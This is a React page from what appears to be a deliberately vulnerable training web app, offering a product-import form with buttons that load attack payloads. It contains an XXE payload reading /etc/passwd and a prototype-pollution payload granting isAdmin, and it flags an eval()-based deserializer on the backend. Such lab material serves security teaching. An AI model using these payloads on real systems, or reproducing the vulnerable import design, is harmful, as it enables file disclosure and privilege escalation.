'use client'

import { useState } from 'react'

export default function ImportPage() {
  const [importType, setImportType] = useState('json')
  const [importDataText, setImportData] = useState(`{
  "products": [
    {
      "name": "New Product",
      "price": 99.99,
      "category": "Electronics"
    }
  ]
}`)
  const [result, setResult] = useState<any>(null)
  const [loading, setLoading] = useState(false)

  const handleImport = async () => {
    setLoading(true)
    try {
      const contentType = importType === 'xml' 
        ? 'application/xml' 
        : 'application/json'
      
      const response = await fetch('/api/admin/import', {
        method: 'POST',
        headers: { 'Content-Type': contentType },
        body: importDataText
      })
      const data = await response.json()
      setResult(data)
    } catch (error: any) {
      setResult({ error: error.message })
    } finally {
      setLoading(false)
    }
  }

  const loadXXEPayload = () => {
    setImportType('xml')
    setImportData(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>99.99</price>
  </product>
</products>`)
  }

  const loadDeserializationPayload = () => {
    setImportType('json')
    setImportData(`{"name": "test", "__proto__": {"isAdmin": true}}`)
  }

  return (
    <div className="container">
      <h1>Product Import</h1>
      
      <div className="alert alert-danger">
        <strong>⚠️ Critical Vulnerabilities:</strong>
        <ul style={{ marginTop: '0.5rem', marginLeft: '1.5rem' }}>
          <li><strong>XXE:</strong> XML external entity injection</li>
          <li><strong>Deserialization:</strong> Uses eval() - can execute arbitrary code</li>
        </ul>
      </div>

      <div style={{ background: 'white', padding: '2rem', borderRadius: '10px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
        <div className="form-group">
          <label>Import Type:</label>
          <select value={importType} onChange={(e) => setImportType(e.target.value)}>
            <option value="json">JSON (Deserialization)</option>
            <option value="xml">XML (XXE)</option>
          </select>
        </div>

        <div className="form-group">
          <label>Import Data (Vulnerable):</label>
          <textarea
            value={importDataText}
            onChange={(e) => setImportData(e.target.value)}
            rows={15}
            style={{ fontFamily: 'monospace' }}
          />
        </div>

        <div style={{ display: 'flex', gap: '1rem' }}>
          <button onClick={handleImport} className="btn btn-primary" disabled={loading}>
            {loading ? 'Importing...' : 'Import Products'}
          </button>
          <button onClick={loadXXEPayload} className="btn btn-secondary">
            Load XXE Payload
          </button>
          <button onClick={loadDeserializationPayload} className="btn btn-secondary">
            Load Deserialization Payload
          </button>
        </div>
      </div>

      {result && (
        <div className={`alert ${result.error ? 'alert-danger' : 'alert-success'}`} style={{ marginTop: '2rem' }}>
          <h3>Import Result:</h3>
          {result.warning && (
            <div style={{ marginTop: '0.5rem', marginBottom: '1rem' }}>
              <strong>Warning:</strong> {result.warning}
            </div>
          )}
          <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {JSON.stringify(result, null, 2)}
          </pre>
        </div>
      )}
    </div>
  )
}

